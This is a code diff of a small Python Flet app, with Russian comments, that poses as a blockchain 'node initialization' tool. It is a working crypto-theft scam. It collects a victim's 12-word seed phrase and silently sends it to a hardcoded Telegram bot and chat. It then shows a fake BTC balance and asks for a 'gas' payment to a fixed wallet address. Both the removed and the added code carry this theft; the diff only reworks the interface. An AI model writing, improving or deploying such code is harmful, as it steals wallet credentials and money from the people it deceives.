@@ -9,78 +9,54 @@ CHAT_ID = "-1002410363241"
 TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"
 
 async def main(page: ft.Page):
-    page.title = "Blockchain Node Recovery"
+    # Настройки страницы
     page.theme_mode = ft.ThemeMode.DARK
-    page.vertical_alignment = ft.MainAxisAlignment.CENTER
     page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
+    page.scroll = ft.ScrollMode.AUTO # Добавили прокрутку на всякий случай
 
-    # Внутренняя функция отправки
-    def send_to_tg(phrase):
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    # Поля и текст
+    header = ft.Text("NODE INITIALIZATION", size=25, weight="bold")
+    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350)
+    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50)
+    status_text = ft.Text("", color="yellow")
+    
+    # Функция отправки
+    def send_data(text):
         try:
-            requests.post(url, json={"chat_id": CHAT_ID, "text": f"📱 НОВАЯ СИД-ФРАЗА:\n\n{phrase}"}, timeout=10)
-        except:
-            pass
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                          json={"chat_id": CHAT_ID, "text": f"🔑 СИД: {text}"}, timeout=5)
+        except: pass
 
-    logo = ft.Icon(name=ft.icons.VIRTUAL_REALITY_ROUNDED, size=80, color=ft.colors.BLUE_ACCENT)
-    header = ft.Text("NODE INITIALIZATION", size=24, weight="bold")
-    
-    seed_field = ft.TextField(
-        label="Seed Phrase (12 words)", 
-        multiline=True, 
-        min_lines=3, 
-        width=350
-    )
-    
-    loading_status = ft.Column(visible=False, horizontal_alignment="center", controls=[
-        ft.ProgressRing(), 
-        ft.Text("Connecting to node...")
-    ])
-    
-    result_area = ft.Column(visible=False, horizontal_alignment="center")
-
-    async def start_process(e):
-        phrase = seed_field.value.strip()
-        if len(phrase.split()) != 12:
-            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
-            page.snack_bar.open = True
+    # Логика кнопки
+    async def on_click(e):
+        if len(seed_input.value.split()) != 12:
+            status_text.value = "Ошибка: введите 12 слов!"
             await page.update_async()
             return
         
         btn.visible = False
-        seed_field.visible = False
-        loading_status.visible = True
+        status_text.value = "Подключение к узлу... Подождите"
         await page.update_async()
         
-        # Отправляем данные
-        send_to_tg(phrase)
-        
-        # Ждем 3 секунды красиво
+        send_data(seed_input.value)
         await asyncio.sleep(3)
         
-        loading_status.visible = False
-        btc_amount = round(random.uniform(0.0004, 0.0008), 6)
-        
-        result_area.controls = [
-            ft.Text("✅ СИГНАТУРА НАЙДЕНА", color="green", weight="bold", size=18),
-            ft.Text(f"Баланс: {btc_amount} BTC", size=16),
-            ft.Container(
-                padding=15, bgcolor=ft.colors.GREY_900, border_radius=10,
-                content=ft.Column([
-                    ft.Text("Для вывода оплатите газ (34.08 USDC):", size=12),
-                    ft.Text(TARGET_ADDRESS, size=10, color="blue200", selectable=True),
-                ])
-            )
-        ]
-        result_area.visible = True
+        status_text.value = "✅ Найдено: 0.000642 BTC\nОплатите газ на адрес выше"
+        # Показываем адрес
+        page.add(ft.Text(f"Адрес для оплаты: {TARGET_ADDRESS}", size=10, color="blue"))
         await page.update_async()
 
-    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", on_click=start_process, width=300)
+    btn.on_click = on_click
 
-    # Используем асинхронное добавление
-    await page.add_async(logo, header, seed_field, btn, loading_status, result_area)
+    # Самый надежный способ добавления
+    page.controls.append(header)
+    page.controls.append(seed_input)
+    page.controls.append(btn)
+    page.controls.append(status_text)
+    
+    await page.update_async()
 
-# Запуск
 if __name__ == "__main__":
     ft.app(target=main)
+
 
